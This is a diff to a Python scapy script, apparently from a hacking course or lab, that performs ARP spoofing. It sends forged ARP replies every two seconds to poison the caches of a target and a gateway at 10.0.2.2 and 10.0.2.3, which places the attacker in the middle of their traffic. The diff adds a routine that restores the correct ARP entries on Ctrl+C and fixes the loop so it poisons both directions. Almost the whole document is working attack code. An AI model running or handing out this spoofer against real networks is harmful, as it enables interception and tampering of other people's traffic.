@@ -2,6 +2,7 @@
 
 from datetime import time
 import time as t
+import sys
 
 import scapy.all as scapy
 from scapy.packet import Packet
@@ -22,10 +23,24 @@ def spoof(target_ip, spoof_ip):
     # print(packet.summary())
     scapy.send(packet, verbose= False)
 
-sent_packet_count = 0
-while True:
-    spoof('10.0.2.2', '10.0.2.3')
-    spoof('10.0.2.3', '10.0.2.4')
-    sent_packet_count = sent_packet_count + 2
-    print('[+] Packet sent: ' + str(sent_packet_count)),
-    t.sleep(2)
+def restore (destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = '10.0.2.2'
+gateway_ip= '10.0.2.3'
+try:
+    sent_packet_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packet_count = sent_packet_count + 2
+        print("\r[+] Packet sent: " + str(sent_packet_count), end=' ')
+        t.sleep(2)
+except KeyboardInterrupt:
+        print('\n[-] CTRL + C Detected... Restoring.\n')
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+
